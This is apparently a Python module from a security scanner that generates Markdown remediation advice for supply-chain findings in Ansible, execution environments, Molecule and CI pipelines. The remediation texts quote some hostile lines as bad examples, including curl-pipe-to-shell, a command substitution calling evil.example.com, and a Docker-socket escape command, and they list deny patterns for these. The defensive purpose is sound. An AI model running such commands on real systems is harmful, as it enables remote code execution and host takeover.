#!/usr/bin/env python3
"""
Remediation generator for supply chain integrity issues
"""

from __future__ import annotations

import re

from . import _pattern_index
from .base import BaseRemediationGenerator, _render_from_metadata


def _first(snippet: str, *patterns: str) -> str | None:
    for pat in patterns:
        m = re.search(pat, snippet, re.IGNORECASE)
        if m:
            return (m.group(1) if m.groups() else m.group(0)).strip().strip("'\"")
    return None


class SupplyChainRemediationGenerator(BaseRemediationGenerator):
    """Generates remediation examples for supply chain security issues"""

    _FIX_MAP = {
        "curl_pipe_to_shell": "curl_pipe_shell",
        "gem_install_local": "install_script",
        "get_url_no_checksum": "get_url_no_checksum",
        "gitlab_snippet_execution": "curl_pipe_shell",
        "install_script_from_url": "install_script",
        "npm_global_install_untrusted": "install_script",
        "pip_install_no_version": "pip_no_pin",
        "python_build_from_source": "pip_no_pin",
        "python_remote_exec": "python_remote_exec",
        "python_setup_py_exec": "pip_no_pin",
        "raw_github_script_exec": "raw_github",
        "wget_pipe_to_shell": "wget_pipe_shell",
        # Ecosystem hygiene (role meta, molecule, EE, bindep)
        "bindep_profile_runs_shell": "bindep_shell",
        "bindep_unpinned_package": "bindep_unpinned",
        "ee_additional_build_files_traversal": "ee_build_files_traversal",
        "ee_additional_build_steps_append_shell": "ee_append_shell",
        "ee_arbitrary_prepend_cmd": "ee_prepend",
        "ee_build_arg_secret": "ee_build_arg_secret",
        "ee_dependencies_galaxy_http": "ee_galaxy_http",
        "ee_dependencies_python_unpinned": "ee_python_unpinned",
        "ee_untrusted_base_image": "ee_base_image",
        "molecule_disable_tls_verify": "molecule_tls",
        "molecule_docker_socket_mount": "molecule_socket",
        "molecule_privileged_container": "molecule_privileged",
        "role_meta_dependency_git_url": "role_meta_git",
        "role_meta_dependency_without_version": "role_meta_unpinned",
        "role_meta_galaxy_info_missing_license": "role_meta_license",
        # CI/CD self-modification
        "gh_actions_pull_request_target": "gh_actions_pull_request_target",
        "gh_actions_unpinned_sha": "gh_actions_unpinned_sha",
        "git_hook_or_config_write": "git_hook_or_config_write",
        "self_modifying_ci_config": "self_modifying_ci_config",
        "selfhosted_runner_untrusted_event": "selfhosted_runner_untrusted_event",
        # Remote-access / tunnel tools that should be removed
        "cloudflared_tunnel_install_arbitrary": "remove_tunnel_tool",
        "frp_fast_reverse_proxy_install": "remove_tunnel_tool",
        "gost_tunnel_listener_install": "remove_tunnel_tool",
        "adb_tcpip_remote_debug_enabled": "adb_tcpip",
        # Vulnerable vendor installs (CVE) -> pin to a patched version
        "xz_liblzma_backdoored_version_install": "vuln_pkg_pin",
        "fortios_ssl_vpn_vulnerable_version_install": "vuln_vendor_upgrade",
        "palo_alto_globalprotect_vulnerable_install": "vuln_vendor_upgrade",
        "ivanti_connect_secure_vulnerable_install": "vuln_vendor_upgrade",
        "check_point_quantum_vulnerable_install": "vuln_vendor_upgrade",
        "connectwise_screenconnect_vulnerable_install": "vuln_vendor_upgrade",
        "fortimanager_fortijndi_vulnerable_install": "vuln_vendor_upgrade",
        "cisco_unified_communications_vulnerable_install": "vuln_vendor_upgrade",
        # Network exposure
        "citrix_netscaler_management_interface_exposed_to_internet": "mgmt_iface_exposed",
        "compose_db_port_bound_0_0_0_0": "compose_db_bind",
        # Supply-chain verification gaps
        "s3_download_no_integrity_check": "s3_integrity",
        "slsa_provenance_verification_missing": "slsa_verify",
        "release_artifact_fetched_without_slsa_or_attestation_verify": "slsa_verify",
        "sigstore_policy_controller_warn_not_enforce": "sigstore_enforce",
        "python_typosquat_package_install": "pip_typosquat",
        # CI / secret hygiene
        "git_hook_or_post_merge_script_fetched_from_remote": "git_hook_remote",
        "sccm_client_push_installation_account_plaintext": "sccm_naa",
        "jenkins_agent_secret_in_url_or_plaintext": "jenkins_secret",
        "github_actions_script_block_injection_untrusted_context": "gh_script_injection",
        "uri_get_url_token_in_url_query_or_userinfo": "token_in_url",
    }

    # Issue types whose generator needs the rule_id (e.g. to look up the
    # vendor-specific title) and is therefore called as gen(code_snippet, rule_id).
    _RULE_ID_AWARE_FIXES = frozenset({"vuln_vendor_upgrade"})

    def generate_supply_chain_fix(self, rule_id: str, code_snippet: str) -> str:
        generators = {
            "curl_pipe_shell": self._generate_curl_pipe_fix,
            "wget_pipe_shell": self._generate_wget_pipe_fix,
            "python_remote_exec": self._generate_python_remote_fix,
            "pip_no_pin": self._generate_pip_pin_fix,
            "raw_github": self._generate_github_raw_fix,
            "install_script": self._generate_install_script_fix,
            "get_url_no_checksum": self._generate_get_url_checksum_fix,
            "role_meta_unpinned": self._generate_role_meta_unpinned_fix,
            "role_meta_git": self._generate_role_meta_git_fix,
            "role_meta_license": self._generate_role_meta_license_fix,
            "molecule_socket": self._generate_molecule_socket_fix,
            "molecule_privileged": self._generate_molecule_privileged_fix,
            "molecule_tls": self._generate_molecule_tls_fix,
            "ee_base_image": self._generate_ee_base_image_fix,
            "ee_prepend": self._generate_ee_prepend_fix,
            "ee_append_shell": self._generate_ee_append_shell_fix,
            "ee_galaxy_http": self._generate_ee_galaxy_http_fix,
            "ee_python_unpinned": self._generate_ee_python_unpinned_fix,
            "ee_build_files_traversal": self._generate_ee_build_files_traversal_fix,
            "ee_build_arg_secret": self._generate_ee_build_arg_secret_fix,
            "bindep_unpinned": self._generate_bindep_unpinned_fix,
            "bindep_shell": self._generate_bindep_shell_fix,
            "gh_actions_unpinned_sha": self._generate_gh_actions_unpinned_sha_fix,
            "gh_actions_pull_request_target": self._generate_gh_actions_pull_request_target_fix,
            "self_modifying_ci_config": self._generate_self_modifying_ci_config_fix,
            "git_hook_or_config_write": self._generate_git_hook_or_config_write_fix,
            "selfhosted_runner_untrusted_event": self._generate_selfhosted_runner_untrusted_event_fix,
            "remove_tunnel_tool": self._generate_remove_tunnel_tool_fix,
            "adb_tcpip": self._generate_adb_tcpip_fix,
            "vuln_pkg_pin": self._generate_vuln_pkg_pin_fix,
            "vuln_vendor_upgrade": self._generate_vuln_vendor_upgrade_fix,
            "mgmt_iface_exposed": self._generate_mgmt_iface_exposed_fix,
            "compose_db_bind": self._generate_compose_db_bind_fix,
            "slsa_verify": self._generate_slsa_verify_fix,
            "s3_integrity": self._generate_s3_integrity_fix,
            "sigstore_enforce": self._generate_sigstore_enforce_fix,
            "pip_typosquat": self._generate_pip_typosquat_fix,
            "git_hook_remote": self._generate_git_hook_remote_fix,
            "sccm_naa": self._generate_sccm_naa_fix,
            "jenkins_secret": self._generate_jenkins_secret_fix,
            "gh_script_injection": self._generate_gh_script_injection_fix,
            "token_in_url": self._generate_token_in_url_fix,
        }
        issue_type = self._FIX_MAP.get(rule_id, "generic")
        gen = generators.get(issue_type)
        if gen is None:
            return self._generate_pattern_driven_fix(rule_id, code_snippet)
        if issue_type in self._RULE_ID_AWARE_FIXES:
            return gen(code_snippet, rule_id)
        return gen(code_snippet)

    def _generate_curl_pipe_fix(self, code_snippet: str) -> str:
        url = _first(code_snippet, r"(https?://[^\s'\"|]+)") or "{{ script_url }}"
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 curl Piped Directly to a Shell:**
Piping `curl` output straight into a shell runs whatever the network serves at
that instant, with no integrity check - a MITM or a compromised host gets RCE.

**\u2705 Secure Fix - Download, Verify, Then Execute:**
```yaml
- name: Download the script to disk (not piped)
  ansible.builtin.get_url:
    url: "{url}"
    dest: /tmp/install.sh
    mode: '0755'
    checksum: "sha256:{{{{ script_sha256 }}}}"
    validate_certs: true

- name: Execute the verified script
  ansible.builtin.command: /bin/sh /tmp/install.sh
  # script_sha256 is the reviewed digest; a content change fails the download above.

- name: Clean up the script
  ansible.builtin.file:
    path: /tmp/install.sh
    state: absent
```

**Why this matters:** Piping remote content to a shell lets a MITM or
compromised host execute arbitrary code. Let the checksum, not the network,
decide what runs.
"""

    def _generate_wget_pipe_fix(self, code_snippet: str) -> str:
        url = _first(code_snippet, r"(https?://[^\s'\"|]+)") or "{{ script_url }}"
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 wget Piped Directly to a Shell:**
Piping `wget` output straight into a shell runs whatever the network serves at
that instant, with no integrity check - a MITM or a compromised host gets RCE.

**\u2705 Secure Fix - Download, Verify, Then Execute:**
```yaml
- name: Download the script to disk (not piped)
  ansible.builtin.get_url:
    url: "{url}"
    dest: /tmp/script.sh
    mode: '0755'
    checksum: "sha256:{{{{ script_sha256 }}}}"
    validate_certs: true

- name: Execute the verified script
  ansible.builtin.command: /bin/sh /tmp/script.sh
  # script_sha256 is the reviewed digest; a content change fails the download above.
```

**Why this matters:** wget-pipe-to-shell is the same supply-chain primitive as
`curl | bash`. Let the checksum, not the network, decide what runs.
"""

    def _generate_github_raw_fix(self, code_snippet: str) -> str:
        url = (
            _first(
                code_snippet,
                r"(https?://raw\.githubusercontent\.com/[^\s'\"|]+)",
                r"(https?://[^\s'\"|]+)",
            )
            or "{{ raw_github_url }}"
        )
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 raw.githubusercontent.com Payload Piped to Shell:**
Raw GitHub content is not a distribution channel - a branch ref can change at
any time, and piping it into a shell executes whatever it returns with no review.

**\u2705 Secure Fix - Pin to a Commit, Verify, Then Execute:**
```yaml
- name: Download the script pinned to an immutable commit SHA
  ansible.builtin.get_url:
    url: "{url}"   # pin .../<commit-sha>/... not .../main/...
    dest: /tmp/install.sh
    mode: '0755'
    checksum: "sha256:{{{{ script_sha256 }}}}"
    validate_certs: true

- name: Execute the verified script
  ansible.builtin.command: /bin/sh /tmp/install.sh
```

**Why this matters:** Pin to a commit SHA and verify the checksum; better still,
mirror the artefact into your own artefact store and reference that.
"""

    def _generate_install_script_fix(self, code_snippet: str) -> str:
        url = _first(code_snippet, r"(https?://[^\s'\"|]+)") or "{{ installer_url }}"
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Vendor Install-Script URL Piped to Shell:**
A vendor `curl|sh` installer runs un-reviewed remote code as it downloads.
Prefer the vendor's signed package repo; if only a script ships, vendor it and
pin a checksum.

**\u2705 Secure Fix - Prefer the Package Repo; Otherwise Pin the Installer:**
```yaml
# Preferred: install the signed package from the vendor's apt/yum repo
- name: Install from the vendor's signed package repository
  ansible.builtin.package:
    name: "{{{{ vendor_package }}}}"
    state: present

# If the vendor only ships a curl|sh installer, vendor it behind your CI:
- name: Download the pinned installer to disk
  ansible.builtin.get_url:
    url: "{url}"
    dest: /tmp/install.sh
    mode: '0755'
    checksum: "sha256:{{{{ installer_sha256 }}}}"
    validate_certs: true

- name: Run the verified installer
  ansible.builtin.command: /bin/sh /tmp/install.sh
```

**Why this matters:** The network should never decide what executes. Use signed
packages, or download + checksum-verify + run explicitly.
"""

    def _generate_python_remote_fix(self, code_snippet: str) -> str:
        url = _first(code_snippet, r"(https?://[^\s'\"|]+)") or "{{ script_url }}"
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Remote Python Script Executed Without Verification:**
Fetching a Python script over the network and running it immediately executes
whatever the host serves, with no integrity guarantee.

**\u2705 Secure Fix - Download, Verify, Then Execute:**
```yaml
- name: Download the Python script to disk
  ansible.builtin.get_url:
    url: "{url}"
    dest: /tmp/setup.py
    checksum: "sha256:{{{{ script_sha256 }}}}"
    validate_certs: true

- name: Execute the verified Python script
  ansible.builtin.command: python3 /tmp/setup.py
```

**Why this matters:** Pin the script's checksum so a content change fails the
download instead of running unreviewed code.
"""

    def _generate_pip_pin_fix(self, code_snippet: str) -> str:
        pkg = (
            _first(
                code_snippet,
                r"pip3?\s+install\s+(?:-[^\s]+\s+)*([A-Za-z0-9._-]+)",
                r"name:\s*[\"']?([A-Za-z0-9._-]+)",
            )
            or "{{ package_name }}"
        )
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Unpinned Python Package Install:**
Installing without a version pin resolves to whatever the index serves now,
so a compromised or yanked release can silently change what you run.

**\u2705 Secure Fix - Pin the Version (or Use a Hash-Locked Requirements File):**
```yaml
- name: Install the pinned package
  ansible.builtin.pip:
    name: "{pkg}=={{{{ {pkg}_version }}}}"
    state: present

# Better: install from a hash-locked requirements file
- name: Install from requirements with hash verification
  ansible.builtin.pip:
    requirements: /path/to/requirements.txt
    # requirements.txt pins: {pkg}==1.2.3 --hash=sha256:...
```

**Why this matters:** A pinned version plus a hash lets pip reject a tampered
artefact instead of installing it.
"""

    def _generate_get_url_checksum_fix(self, code_snippet: str) -> str:
        url = (
            _first(code_snippet, r"url:\s*[\"']?(https?://[^\s'\"]+)", r"(https?://[^\s'\"|]+)")
            or "{{ artifact_url }}"
        )
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Download Without Checksum Verification:**
`get_url` without a `checksum:` accepts whatever bytes arrive, so a MITM or a
mutated upstream artefact is installed without detection.

**\u2705 Secure Fix - Verify the Download Against a Known Digest:**
```yaml
- name: Download the artifact with checksum verification
  ansible.builtin.get_url:
    url: "{url}"
    dest: /tmp/artifact
    checksum: "sha256:{{{{ artifact_sha256 }}}}"
    validate_certs: true
```

**Why this matters:** A pinned checksum makes the task fail closed when the
artefact changes, instead of installing tampered content.
"""

    def _generate_pattern_driven_fix(self, rule_id: str, code_snippet: str) -> str:
        return _render_from_metadata(rule_id, code_snippet)

    # Ecosystem remediation generators
    def _generate_role_meta_unpinned_fix(self, code_snippet: str) -> str:
        return f"""
**Unpinned role dependency in meta/main.yml:**
```yaml
{code_snippet}
```

**Why this matters:** An unpinned Galaxy role dependency resolves to whatever
the upstream maintainer publishes at install time. A compromised or
malicious release ships into every `ansible-galaxy install -r` run.

**Secure fix - pin to an immutable version or sha:**
```yaml
dependencies:
  - role: geerlingguy.nginx
    version: "3.1.1"          # pinned Galaxy release
  - src: https://github.com/acme/ansible-role-foo
    version: "abc123def456"   # pinned git sha, not a branch
```

**Hardening:**
- Keep a `collections/requirements.yml` with every role + its version pinned.
- Add a CI step that diffs the installed roles against a committed `roles.lock`
  (generate with `ansible-galaxy role list --format=yaml > roles.lock`).
- Treat an unpinned role dep as a PR blocker, same as a missing package version.
"""

    def _generate_role_meta_git_fix(self, code_snippet: str) -> str:
        return f"""
**Role pulled from a git URL:**
```yaml
{code_snippet}
```

**Why this matters:** A git URL without a pinned `version:` is a moving
target. The upstream repo's default branch can be force-pushed; a compromised
maintainer can silently swap content under the same URL.

**Secure fix:**
```yaml
dependencies:
  - src: https://github.com/acme/ansible-role-foo
    version: "abc123def4567890..."   # immutable sha, NOT a branch name
    scm: git
```

**Even better - prefer Galaxy:** a Galaxy-published role has a signed,
versioned artefact; a git URL does not. Only use git URLs for internal forks
you control end-to-end.
"""

    def _generate_role_meta_license_fix(self, code_snippet: str) -> str:
        return f"""
**Role meta/main missing `license:`:**
```yaml
{code_snippet}
```

**Why this matters:** A role with no declared license can't be safely
consumed in commercial pipelines. Downstream users are in legal limbo - some
corporate CI systems will refuse to install an unlicensed role at all.

**Fix - add an SPDX identifier matching your LICENSE file:**
```yaml
galaxy_info:
  author: Your Name
  description: What this role does
  license: MIT                 # or Apache-2.0, BSD-3-Clause, GPL-3.0-or-later
  min_ansible_version: "2.14"
  platforms:
    - name: EL
      versions: ["9"]
```

Always use the SPDX identifier (`MIT`, not "MIT License"). CI linters verify
it against the SPDX list.
"""

    def _generate_molecule_socket_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 Molecule mounts /var/run/docker.sock (container-escape primitive):**
```yaml
{code_snippet}
```

**Why this is CRITICAL:** The Docker socket inside a container gives that
container full control of the Docker daemon on the host. A compromised role
under test runs `docker run --privileged --pid=host --net=host` on your
CI runner - full host takeover, every `molecule test`.

**\u2705 Secure Fix - remove the bind mount; use Molecule's native driver:**
```yaml
platforms:
  - name: instance
    image: "geerlingguy/docker-rockylinux9-ansible:latest"
    command: ""
    pre_build_image: true
    # No volumes:[...] mounting /var/run/docker.sock.
```

**If you genuinely need docker-in-docker** for tests, use an isolated DinD
sidecar service with its own socket - never bind-mount the host's.

**CI hardening:** Deny-list the host socket in your runner's seccomp profile:
`"/var/run/docker.sock"` is never a legitimate mount for a test scenario.
"""

    def _generate_molecule_privileged_fix(self, code_snippet: str) -> str:
        return f"""
**Molecule scenario runs with `privileged: true`:**
```yaml
{code_snippet}
```

**Why this matters:** `privileged: true` grants the container every kernel
capability plus access to host devices. A bad role under test gets raw
kernel-level reach on the CI host.

**\u2705 Secure Fix - drop privileged; add only what's strictly needed:**
```yaml
platforms:
  - name: instance
    image: "geerlingguy/docker-rockylinux9-ansible:latest"
    # If the role under test uses systemd, use this - NOT privileged:
    systemd: always
    tmpfs:
      - /run
      - /tmp
    capabilities:
      - SYS_ADMIN       # only if role manages cgroups/mounts
    command: /usr/sbin/init
```

Most Ansible role tests work with `systemd: always` + specific `capabilities`.
Reach for `privileged: true` only when profiling kernel modules, and isolate
such scenarios on a dedicated runner.
"""

    def _generate_molecule_tls_fix(self, code_snippet: str) -> str:
        return f"""
**Molecule driver disables TLS verification:**
```yaml
{code_snippet}
```

**Why this matters:** `tls_verify: false` / `verify_ssl: false` / `insecure_registry`
turns the registry pull into an MITM-able channel. An attacker on the CI
network swaps the test image and runs arbitrary code in every test run.

**\u2705 Secure Fix - keep TLS verification ON:**
```yaml
driver:
  name: docker
  # tls_verify, verify_ssl default to true - don't touch them.

# If your registry has a private CA, mount the CA bundle into the container
# rather than disabling verification:
platforms:
  - name: instance
    image: "registry.corp.example.com/ansible/testimage:1.2.3@sha256:..."
    volumes:
      - "/etc/pki/ca-trust/source/anchors:/etc/pki/ca-trust/source/anchors:ro"
```

If you truly must bypass TLS for a local dev registry, scope it to that
single registry in Docker's `daemon.json` and never commit that config.
"""

    def _generate_ee_base_image_fix(self, code_snippet: str) -> str:
        return f"""
**Execution Environment base image not pinned to a digest:**
```yaml
{code_snippet}
```

**Why this matters:** `name: foo/bar:latest` (or any floating tag) pulls
whatever the upstream publishes at build time. The maintainer - or a
compromised upstream - can swap it silently into every subsequent EE build.

**Secure fix - pin to an immutable digest:**
```yaml
version: 3
images:
  base_image:
    name: registry.redhat.io/ansible-automation-platform-24/ee-minimal-rhel9@sha256:abc123...
dependencies:
  ansible_core:
    package_pip: "ansible-core==2.15.8"
  ansible_runner:
    package_pip: "ansible-runner==2.3.6"
  galaxy: requirements.yml
  python: requirements.txt
  system: bindep.txt
```

**Digest rotation policy:** update the digest via PR, gated on a CI
run that verifies the new image builds cleanly. Never use `:latest`.
"""

    def _generate_ee_prepend_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 EE additional_build_steps.prepend runs arbitrary shell:**
```yaml
{code_snippet}
```

**Why this is CRITICAL:** `additional_build_steps.prepend` runs as `RUN`
directives during the `ansible-builder` image build. A `curl | sh` primitive
here bakes a backdoor into every EE built from this file - every ad-hoc
Ansible run on the controller subsequently executes attacker code.

**Secure fix - replace shell with declarative alternatives:**
```yaml
# Instead of running curl | sh, vendor the file and COPY it:
additional_build_steps:
  prepend: |
    COPY _preflight/setup.sh /tmp/setup.sh
    RUN sha256sum /tmp/setup.sh | grep -q '^abc123 ' && /tmp/setup.sh
```

**Reviewable patterns only:**
- `COPY` files committed to the repo.
- `RUN` with a checksum-gated script.
- `ENV`, `LABEL`, `USER`.

**Anti-patterns (ban in CI):** `curl ... | sh`, `wget -O- ... | bash`,
`eval $(...)`, any pipe-to-shell primitive in a `prepend` step.
"""

    def _generate_ee_append_shell_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 EE additional_build_steps.append pipes to shell:**
```yaml
{code_snippet}
```

**Why this is CRITICAL:** `append` runs at the END of the EE image build as
`RUN` directives - a `curl | sh` here is equivalent to the prepend variant
(build-time RCE that bakes into every EE run) but with the added property
that it lands in the final layer, so earlier cached layers can't short-circuit
it. Every ad-hoc playbook executed against this EE afterwards runs the
attacker-controlled tail step.

**Secure fix - stage the payload, verify, then install from local:**
```yaml
# bad:
# additional_build_steps:
#   append: |
#     RUN curl -fsSL https://example.com/install.sh | sh
# good:
additional_build_files:
  - src: files/install.sh
    dest: configs
additional_build_steps:
  append: |
    COPY _build/configs/install.sh /tmp/install.sh
    RUN echo "<sha256-hex>  /tmp/install.sh" | sha256sum -c - \\
     && chmod 0755 /tmp/install.sh \\
     && /tmp/install.sh
```

**Reviewable patterns only in `append`:**
- `RUN <package-manager> clean / cache purge` (e.g., `dnf clean all`).
- `USER <non-root>` to downgrade from build-root.
- `LABEL` / `ENV` finalization.
- Checksum-gated installs from paths already in the build context.

**Anti-patterns (ban in CI):** `curl ... | sh`, `wget -O- ... | bash`,
`pip install <url>`, `bash <(curl ...)`, any pipe-to-shell primitive.
Enforce with a CI check that greps the EE definition for `curl|wget` within
`additional_build_steps.append` and fails the build.
"""

    def _generate_ee_galaxy_http_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 EE dependencies.galaxy references HTTP(S) URL:**
```yaml
{code_snippet}
```

**Why this is HIGH:** `ansible-builder` downloads whatever the URL returns
at build time. A compromised fetch - MITM, CDN cache poisoning, typo-squat,
repo account takeover - silently swaps the collections/roles installed into
the EE. The EE git repo shows no change; every rebuild pulls the new payload.

**Secure fix - commit the requirements file locally:**
```yaml
# execution-environment.yml
version: 3
images:
  base_image:
    name: registry.redhat.io/ansible-automation-platform-24/ee-minimal-rhel9@sha256:<digest>
dependencies:
  galaxy: requirements.yml       # local file, auditable in git
  python: requirements.txt
```

**`requirements.yml` (committed alongside):**
```yaml
collections:
  - name: community.general
    version: "9.0.1"            # exact version
  - name: ansible.posix
    version: "1.5.4"
  - name: myorg.internal
    source: git+ssh://git@github.com/myorg/ansible-collection-internal.git
    type: git
    version: "e3a1f2b9c4d5e6f708192a3b4c5d6e7f8091a2b3"   # commit SHA, not a branch
roles:
  - src: geerlingguy.postgresql
    version: "3.5.2"
```

**Hardening:**
- Mirror galaxy.ansible.com through your internal Artifactory/Nexus and pin
  `server_list` in `ansible.cfg` to the mirror (cuts egress + MITM risk).
- CI check: `grep -E '^\\s*galaxy\\s*:\\s*https?://' execution-environment.yml`
  - fail the build if any hit.
- Review collection/role updates in a PR that also re-locks the file
  (`ansible-galaxy collection install -r requirements.yml --list`).
"""

    def _generate_ee_python_unpinned_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 EE dependencies.python contains unpinned package:**
```yaml
{code_snippet}
```

**Why this is MEDIUM:** Each EE rebuild resolves unpinned packages against
live PyPI. A single compromised upstream (shai-hulud-style account takeover,
ctx typo-squat, dependency confusion in internal mirrors) gets baked into
the EE on the next build and runs inside every ad-hoc Ansible execution on
the controller.

**Secure fix - generate a hash-locked file with pip-compile:**
```bash
pip install pip-tools
pip-compile --generate-hashes --output-file requirements.txt requirements.in
```

**`requirements.in` (the source of truth):**
```text
requests==2.32.3
boto3==1.34.51
jinja2==3.1.4
```

**`requirements.txt` (generated, checked into git):**
```text
requests==2.32.3 \\
    --hash=sha256:70761cfe03c773ceb22aa2f671b4757976145175cdfca038c02654d061d6dcc6 \\
    --hash=sha256:55365417734eb18255590a9ff9eb97e9e1da868d4ccd6402399eaf68af20a760
# ... every transitive pinned + hashed ...
```

**`execution-environment.yml`:**
```yaml
dependencies:
  python: requirements.txt     # pinned + hashed, deterministic
```

**Hardening:**
- Use an internal PyPI mirror (DevPi, Artifactory) as `--index-url` in the
  EE build so dependency confusion (internal vs. public name collision) is
  not exploitable.
- CI gate: re-run `pip-compile --upgrade` on a schedule (e.g. weekly) and
  open a PR with the diff - every dependency change gets human review.
- Scan the locked file with Trivy/Grype as part of the EE build pipeline.
"""

    def _generate_ee_build_files_traversal_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 EE additional_build_files uses path traversal or absolute path:**
```yaml
{code_snippet}
```

**Why this is HIGH:** `ansible-builder` copies every path listed under
`additional_build_files` into the EE build context. If the path escapes the
project directory (`../../secrets/`, `/root/.ssh/id_rsa`), the EE can
silently include host secrets or content from anywhere the build user can
read - a compromised EE definition becomes an exfiltration primitive that a
reviewer won't notice unless they trace every `src:` line.

**Secure fix - keep sources inside the project tree:**
```yaml
additional_build_files:
  - src: files/cacert.pem       # within the EE project
    dest: configs
  - src: files/app.conf
    dest: configs
```

**If the source truly lives outside the project tree, stage it in CI first:**
```yaml
# .github/workflows/build-ee.yml
- name: Stage external artifact
  run: |
    install -m 0644 /opt/release/my-tool ee/files/my-tool
    echo "<sha256>  ee/files/my-tool" | sha256sum -c -
- name: Build EE
  run: ansible-builder build -t my-ee:latest --context ./ee
```
- the EE definition itself only references `files/my-tool`, which a
reviewer can see in the git diff.

**Hardening:**
- CI check: fail the build if any `additional_build_files.src` starts with
  `..`, `/`, `~`, or resolves outside the EE project directory.
- Treat `additional_build_files` as security-critical in code review; require
  a second reviewer for changes to it.
- Never allow `src:` to reference `~/.ssh/`, `/root/`, or any path outside
  the EE repo.
"""

    def _generate_ee_build_arg_secret_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 EE ARG exposes credential-shaped variable:**
```yaml
{code_snippet}
```

**Why this is HIGH:** Values passed to `docker build --build-arg SECRET=...`
are persisted in the image's layer metadata. `docker history --no-trunc` and
`podman image inspect` both print the `ARG` lines verbatim - any consumer of
the EE image (downstream registry, CI caches, scanners, operators pulling
for debugging) sees the secret. This is the #1 way production tokens leak
from CI-built images.

**Secure fix - BuildKit secret mounts (not persisted in the image):**
```dockerfile
# syntax=docker/dockerfile:1.7
FROM registry.redhat.io/.../ee-minimal-rhel9:latest

# Secret is available ONLY during this RUN, never baked into a layer:
RUN --mount=type=secret,id=pypi_token,target=/run/secrets/pypi_token \\
    pip config set global.index-url \\
      "https://__token__:$(cat /run/secrets/pypi_token)@pypi.example.com/simple/" \\
 && pip install --no-cache-dir -r requirements.txt
```

**Supply the secret at build time (not in the Dockerfile):**
```bash
DOCKER_BUILDKIT=1 docker build \\
  --secret id=pypi_token,src="$HOME/.secrets/pypi_token" \\
  -t my-ee:latest .
```

**For ansible-builder specifically, move the secret-requiring step into CI
so the EE never sees the credential:**
```yaml
# CI job - before ansible-builder runs
- name: Pre-fetch private collections
  env:
    GALAXY_TOKEN: ${{{{ secrets.GALAXY_TOKEN }}}}
  run: |
    ansible-galaxy collection install -r ee/requirements.yml \\
      -p ee/_vendored_collections
# Now the EE build references ee/_vendored_collections via additional_build_files;
# the token never touches the image.
- name: Build EE
  run: ansible-builder build -t my-ee:latest --context ./ee
```

**Hardening:**
- CI check: grep the Containerfile / EE definition for `ARG ` followed by
  any of `SECRET|TOKEN|KEY|PASSWORD|PASSWD`; fail the build on a hit.
- Scan every EE image push with Trivy's `--security-checks secret` to catch
  leaks that slipped past code review.
- Rotate any credential that ever appeared as a build-arg; treat it as
  public.
"""

    def _generate_bindep_unpinned_fix(self, code_snippet: str) -> str:
        return f"""
**bindep.txt entry without a version constraint:**
```yaml
{code_snippet}
```

**Why this matters:** A bare package name in `bindep.txt` pulls whatever the
distro publishes at build time. Future EE rebuilds silently upgrade/downgrade
system packages - invalidates cached CVE scan results and breaks reproducible
builds.

**Secure fix - add a version constraint + platform tag:**
```
# bindep.txt
openssl [platform:rpm >=3.0.7]
libffi-devel [platform:rpm]
git [platform:rpm >=2.39]
```

**For hard pins:** use `==`:
```
openssl [platform:rpm ==3.0.7-25.el9_3]
```

**CI hardening:** diff `bindep.txt` against a lockfile generated from a
successful build. Any silent drift in system package versions must appear in
the PR's CI output.
"""

    def _generate_bindep_shell_fix(self, code_snippet: str) -> str:
        return f"""
**🚨 bindep.txt entry contains a shell primitive:**
```yaml
{code_snippet}
```

**Why this is CRITICAL:** bindep evaluates its profile lines. A `$(...)`,
backtick, or pipe-to-shell primitive here runs arbitrary shell during every
EE build - and EE builds run in CI under the controller's credentials.

**Secure fix - bindep lines are PURE package specs, nothing else:**
```
# ❌ NEVER
custom-package [platform:rpm]  $(curl evil.example.com)

# ✅ Pure package name + platform tag + optional version:
custom-package [platform:rpm >=1.0]
```

**If you genuinely need a preflight script** during image build, put it in
`execution-environment.yml`'s `additional_build_steps` (which is at least
reviewable and subject to the `ee_arbitrary_prepend_cmd` rule) - never in
`bindep.txt`.

**Pre-commit enforcement:** `rg -n '(\\$\\(|\\`|\\|\\s*(sh|bash))' bindep.txt`
should return zero matches.
"""

    def _generate_gh_actions_unpinned_sha_fix(self, code_snippet: str) -> str:
        return f"""
**❌ Vulnerable Code:**
```yaml
{code_snippet}
```

**🚨 Third-Party Action Not Pinned to a SHA:**
`uses: owner/action@v1` (or `@main`, `@master`, `@latest`) is a **mutable** tag.
Any compromise of the action's tag - including a malicious retag by a
maintainer - lands silently in every subsequent workflow run. This is exactly
how the tj-actions/changed-files 2025 supply-chain attack propagated.

**✅ Secure Fix - pin every third-party action to a full 40-character SHA:**
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - uses: tj-actions/changed-files@a284dc1814e3fe7ab40ebf11b00c5ad83d5c9b74  # v45.0.4
        # Keep the version in a trailing comment so humans can read it.
```

**✅ Automate SHA maintenance with Dependabot (`.github/dependabot.yml`):**
```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

**🔐 Organization-wide enforcement:**
- Enable **required actions** in org settings: restrict allowed actions to
  `actions/*`, `github/*`, and an explicit allowlist; require SHA pinning.
- Add a pre-merge CI check with `stepsecurity/harden-runner` in audit mode -
  it fails PRs that introduce unpinned third-party actions.
- Audit quarterly: `git grep -E 'uses: [^/]+/[^@]+@(v[0-9]|main|master|latest)'`
  across all workflows should return zero matches for third-party actions.
"""

    def _generate_gh_actions_pull_request_target_fix(self, code_snippet: str) -> str:
        return f"""
